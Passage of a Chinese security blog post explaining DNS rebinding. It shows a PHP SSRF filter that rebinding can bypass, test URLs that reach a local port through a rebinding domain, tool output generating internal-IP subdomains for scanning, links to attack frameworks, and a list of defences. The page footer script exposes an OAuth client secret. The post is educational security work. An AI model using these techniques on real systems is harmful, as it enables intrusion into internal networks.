+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function check_inner_ip($url)</span><br><span class="line">&#123;</span><br><span class="line">	$match_result&#x3D;preg_match(&#39;&#x2F;^(http|https)?:\&#x2F;\&#x2F;.*(\&#x2F;)?.*$&#x2F;&#39;,$url);</span><br><span class="line">	if (!$match_result)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;url fomat error&#39;;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		$url_parse&#x3D;parse_url($url);</span><br><span class="line">	&#125;</span><br><span class="line">	catch(Exception $e)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;url fomat error&#39;;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	$hostname&#x3D;$url_parse[&#39;host&#39;];</span><br><span class="line">	$ip&#x3D;gethostbyname($hostname);</span><br><span class="line">	$int_ip&#x3D;ip2long($ip);</span><br><span class="line">	return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 &#x3D;&#x3D; $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 &#x3D;&#x3D; $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 &#x3D;&#x3D; $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 &#x3D;&#x3D; $int_ip&gt;&gt;16;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safe_request_url($url)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	if (check_inner_ip($url))</span><br><span class="line">	&#123;</span><br><span class="line">		echo $url.&#39; is inner ip&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$ch &#x3D; curl_init();</span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">		curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class="line">		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class="line">		$output &#x3D; curl_exec($ch);</span><br><span class="line">		$result_info &#x3D; curl_getinfo($ch);</span><br><span class="line">		if ($result_info[&#39;redirect_url&#39;])</span><br><span class="line">		&#123;</span><br><span class="line">			safe_request_url($result_info[&#39;redirect_url&#39;]);</span><br><span class="line">		&#125;</span><br><span class="line">		curl_close($ch);</span><br><span class="line">		print(&quot;ok&quot;);</span><br><span class="line">		print_r($output);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url&#x3D;@$_GET[&#39;url&#39;];</span><br><span class="line">safe_request_url($url);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接打开 <code>http://127.0.0.1/ctf/ssrf_check.php?url=https://www.baidu.com</code></p>
+<p><img src="8.png" alt="dns-rebinding-bypass"></p>
+<p>可以正常打开，这时候我们尝试去获取本地key</p>
+<p><code>http://127.0.0.1/ctf/ssrf_check.php?url=http://127.0.0.1:1666/</code></p>
+<p><img src="9.png" alt="dns-rebinding-bypass"></p>
+<p>已经被识别出来是内网ip被拦截掉了，一般来说没什么问题，这时我们尝试下上面搭好的环境。</p>
+<p><code>http://127.0.0.1/ctf/ssrf_check.php?url=http://sdf.ssrf.loongten.com:1666/</code></p>
+<p><img src="10.png" alt="dns-rebinding-bypass"></p>
+<h2 id="绕过同源策略限制攻击"><a href="#绕过同源策略限制攻击" class="headerlink" title="绕过同源策略限制攻击"></a>绕过同源策略限制攻击</h2><p>这种情况利用方式很多，比如可以CSRF/XSS 窃取用户数据</p>
+<h2 id="绕过代理IP限制"><a href="#绕过代理IP限制" class="headerlink" title="绕过代理IP限制"></a>绕过代理IP限制</h2><p>跟前面讲到的绕过ssrf差不多</p>
+<h2 id="批量扫内网"><a href="#批量扫内网" class="headerlink" title="批量扫内网"></a>批量扫内网</h2><p>这种方式可以在SSRF或者XSS上利用，使用[Tr3jer的dnsAutoRebinding]搭建dns服务器环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python lib&#x2F;common.py 192.168.1.1</span><br><span class="line"></span><br><span class="line">1. Single IP Covert For En</span><br><span class="line">2. Build IP List</span><br><span class="line">[+] [1 By Default&#x2F;2]2</span><br><span class="line">[+] Please Input Segment Length [24 By Default]</span><br><span class="line">[+] Please Input Encoding [&#39;ipv4&#39; By Default]hex</span><br><span class="line">[+] Please Input Server Root Address [test.example.com By Default]</span><br><span class="line">[+] Stored in the 20170625223912_test_example_com_hex.txt</span><br><span class="line">[root@VM_34_252_centos dnsAutoRebinding]# head -n 5 20170625223912_test_example_com_hex.txt</span><br><span class="line">3139322e3136382e312e31.test.example.com</span><br><span class="line">3139322e3136382e312e32.test.example.com</span><br><span class="line">3139322e3136382e312e33.test.example.com</span><br><span class="line">3139322e3136382e312e34.test.example.com</span><br><span class="line">3139322e3136382e312e35.test.example.com</span><br></pre></td></tr></table></figure>
+
+
+<p>批量生成内网地址进行请求</p>
+<h1 id="攻击框架"><a href="#攻击框架" class="headerlink" title="攻击框架"></a>攻击框架</h1><p><a href="https://github.com/nccgroup/singularity" target="_blank" rel="noopener">https://github.com/nccgroup/singularity</a></p>
+<p><a href="https://github.com/FSecureLABS/dref" target="_blank" rel="noopener">https://github.com/FSecureLABS/dref</a></p>
+<p><a href="https://github.com/Tr3jer/dnsAutoRebinding" target="_blank" rel="noopener">https://github.com/Tr3jer/dnsAutoRebinding</a></p>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>DNS重新绑定之所以如此有趣，是因为它利用了Internet基本结构中的两个主要功能，而且能在很短的时间内更新：</p>
+<ol>
+<li>浏览器在默认情况下，会运行JavaScript（包括BeEF hooks 之类的东西）</li>
+<li>可以在DNS 设置较低的TTL，以便可以不断更换映射的IP</li>
+</ol>
+<p>由于攻击利用了互联网的这些基本组成部分，因此防御是很特殊的。通常的做法有</p>
+<ol>
+<li>限制JavaScript的运行（让攻击者没办法再次请求，noscript可以实现）</li>
+<li>将域名与ip固定（这样它们就不能重复更改）</li>
+<li>不接受小于特定大小的TTL（因此它们无法更改）</li>
+<li>不接受DNS是私有地址的请求（对于外部请求来说）（这样​​它们就不会扩展到内网）</li>
+<li>在本地运行的端口服务校验来源域名</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://crypto.stanford.edu/dns/" target="_blank" rel="noopener">Protecting Browsers from DNS Rebinding Attacks </a>, Stanford University,Collin Jackson, Adam Barth, Andrew Bortz, Weidong Shao, and Dan Boneh<br>In Proceedings of ACM CCS 07,December 3, 2007</p>
+<p><a href="https://danielmiessler.com/blog/dns-rebinding-explained/" target="_blank" rel="noopener">DNS Rebinding Attacks Explained</a>,DANIEL MIESSLER, JULY 27, 2018</p>
+<p><a href="https://www.tripwire.com/state-of-security/vert/practical-attacks-dns-rebinding/" target="_blank" rel="noopener">Practical Attacks with DNS Rebinding</a>,CRAIG YOUNG,APR 3, 2018</p>
+<p><a href="https://mp.weixin.qq.com/s/545el33HNI0rVi2BGVP5_Q" target="_blank" rel="noopener">Use DNS Rebinding to Bypass SSRF in Java</a>，美丽联合集团安全应急响应中心，JoyChou@美联安全，2017年9月11日</p>
+<p><a href="https://paper.seebug.org/188/" target="_blank" rel="noopener"> Use DNS Rebinding to Bypass IP Restrictionn</a> , ricterz ,2017年01月19日</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://www.loongten.com">keacwu</a>
+            <p>原文链接：<a href="http://www.loongten.com/2020/02/26/dns-rebinding-bypass/">http://www.loongten.com/2020/02/26/dns-rebinding-bypass/</a>
+            <p>发表日期：<a href="http://www.loongten.com/2020/02/26/dns-rebinding-bypass/">February 26th 2020, 6:59:22 pm</a>
+            <p>更新日期：<a href="http://www.loongten.com/2020/02/26/dns-rebinding-bypass/">February 28th 2020, 6:04:39 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/02/27/pentest-ssrf/" title= "SSRF服务器端请求伪造">
+                    <div class="nextTitle">SSRF服务器端请求伪造</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/02/22/ctf-php-md5/" title= "CTF中常见php-MD5()函数漏洞">
+                    <div class="prevTitle">CTF中常见php-MD5()函数漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        id: "dns rebinding bypass", // 可选。默认为 location.href
+        owner: 'keac',
+        repo: 'keac',
+        clientID: '4eb4b81722e704969d15',
+        clientSecret: '8a0cf2c65f9a922efa1560012652e383fb383d09',
+        admin:['keac'],
+        distractionFreeMode: false
+    })
+    gitalk.render('container')
+
+    // var gitment = new Gitment({
+    //     // id: "dns rebinding bypass", // 可选。默认为 location.href
+    //     owner: 'keac',
+    //     repo: 'keac',
+    //     oauth: {
+    //         client_id: '4eb4b81722e704969d15',
+    //         client_secret: '8a0cf2c65f9a922efa1560012652e383fb383d09',
+    //     },
+    // })
+    // gitment.render('container')
+
+</script>
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:admin@wgpsec.org" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/keac" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/2113907307" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//www.zhihu.com/people/keac" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS-Rebinding-原理"><span class="toc-number">2.</span> <span class="toc-text">DNS Rebinding 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS"><span class="toc-number">2.1.</span> <span class="toc-text">DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-TTL"><span class="toc-number">2.1.1.</span> <span class="toc-text">DNS TTL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器同源策略"><span class="toc-number">2.2.</span> <span class="toc-text">浏览器同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Rebinding"><span class="toc-number">2.3.</span> <span class="toc-text">DNS Rebinding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击流程"><span class="toc-number">2.4.</span> <span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#技术实现"><span class="toc-number">3.</span> <span class="toc-text">技术实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ceye"><span class="toc-number">3.1.</span> <span class="toc-text">Ceye</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自建"><span class="toc-number">3.2.</span> <span class="toc-text">自建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#准备域名"><span class="toc-number">3.2.1.</span> <span class="toc-text">准备域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搭建dns服务器"><span class="toc-number">3.2.2.</span> <span class="toc-text">搭建dns服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过SSRF-IP限制"><span class="toc-number">3.3.</span> <span class="toc-text">绕过SSRF IP限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">3.3.1.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过原理"><span class="toc-number">3.3.2.</span> <span class="toc-text">绕过原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TTL"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">TTL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试"><span class="toc-number">3.3.3.</span> <span class="toc-text">漏洞测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过同源策略限制攻击"><span class="toc-number">3.4.</span> <span class="toc-text">绕过同源策略限制攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过代理IP限制"><span class="toc-number">3.5.</span> <span class="toc-text">绕过代理IP限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#批量扫内网"><span class="toc-number">3.6.</span> <span class="toc-text">批量扫内网</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击框架"><span class="toc-number">4.</span> <span class="toc-text">攻击框架</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解决方案"><span class="toc-number">5.</span> <span class="toc-text">解决方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 71
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2020/08/09/idea-jetbrains-agent-latest/" >idea-jetbrains-agent-latest</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/2020/08/02/wifipi/" >wifipi</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2020/05/31/xss-waf/" >Xss bypass waf 并且构造函数 使危害更大</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2020/04/06/study-rabbitMq-install/" >rabbitMq 安装学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/redis-Loophole/" >redis 未授权访问漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href= "/2020/03/07/ctf-php-serialization/" >php 反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2020/02/27/pentest-ssrf/" >SSRF服务器端请求伪造</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/2020/02/26/dns-rebinding-bypass/" >dns rebinding bypass</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2020/02/22/ctf-php-md5/" >CTF中常见php-MD5()函数漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span><a class="archive-post-title" href= "/2020/02/15/install-libmysqld-dev/" >Ubuntu 安装 libmysqld-dev</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span><a class="archive-post-title" href= "/2020/02/11/vmware-install-macos/" >Vmware 安装 Macos</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/use-supervisor/" >Supervisor 守护进程工具 使用详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2020/01/10/ctfwp-simple-Crypto/" >CTFWP 简单密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2020/01/10/ctfwp-Audio-steganography/" >CTFWP 音频隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2020/01/10/ctfwp-bugku-Careful-elephant/" >CTFWP 细心的大象</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/ctfwp-jarvisoj-sdjmm/" >CTFWP jarvisoj 神盾局的秘密</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/ctfwp-bugku-flag-php/" >CTFWP BugKu flag.php 题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span><a class="archive-post-title" href= "/2020/01/08/pentest-xss-beef/" >BEEF 安装使用</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/2019/12/30/find-UEditor-version/" >渗透测试技巧-寻找 UEditor 版本</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2019/12/29/pentest-learn-xss-bypass/" >XSS 绕过姿势</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/2019/12/28/pentest-learn-sql-bypass/" >SQL注入绕过 方式总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span><a class="archive-post-title" href= "/2019/12/28/pentest-learn-sql/" >SQL注入学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/23</span><a class="archive-post-title" href= "/2019/12/23/pentest-learn-xss/" >XSS 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/23</span><a class="archive-post-title" href= "/2019/12/23/ctf-entry/" >CTF入门简单讲解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/20</span><a class="archive-post-title" href= "/2019/12/20/find-alibaba-xss/" >一枚阿里巴巴主站XSS挖掘之旅</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2019/12/19/ubuntu19-change-ip/" >Ubuntu19 更改ip - 内网渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2019/12/08/centos7-install-awvs/" >Centos7 安装 AWVS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2019/12/06/Burpsuite-v2-1-install/" >Burpsuite 激活简便使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2019/12/06/pentest-disposable-mobile-number/" >渗透测试资源-一次性手机号</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
